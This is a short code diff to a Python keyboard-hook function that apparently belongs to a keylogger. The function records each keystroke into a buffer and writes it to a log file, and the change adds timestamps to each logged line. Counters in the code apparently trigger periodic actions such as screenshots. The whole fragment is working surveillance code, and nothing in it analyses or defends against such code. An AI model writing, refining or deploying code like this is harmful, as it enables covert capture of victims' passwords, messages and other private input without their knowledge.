@@ -464,29 +464,32 @@ def OnKeyboardEvent(event):
     logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
 
     if event.Ascii == 13:
-        keys = '\n'
-        buffer = buffer + keys
+      
+        buffer = current_system_time.strftime("%d/%m/%Y-%H|%M|%S") + ": " + buffer
         logging.log(10, buffer)
         buffer = ''
         count_letter = count_letter + 1
         count_scr = count_scr + 1
+        
     elif event.Ascii == 8:
+      
         buffer = buffer[:-1]
-        logging.log(10, buffer)
-        buffer = ''
         count_letter = count_letter + 1
         count_scr = count_scr + 1
+        
     elif event.Ascii == 9:
+      
         keys = '\t'
         buffer = buffer + keys
         count_letter = count_letter + 1
         count_scr = count_scr + 1
+        
     elif event.Ascii >= 32 and event.Ascii <= 127:
+      
         keys = chr(event.Ascii)
         buffer = buffer + keys
         count_letter = count_letter + 1
         count_scr = count_scr + 1
-
 
     if count_letter == 300:
         count_letter = 0
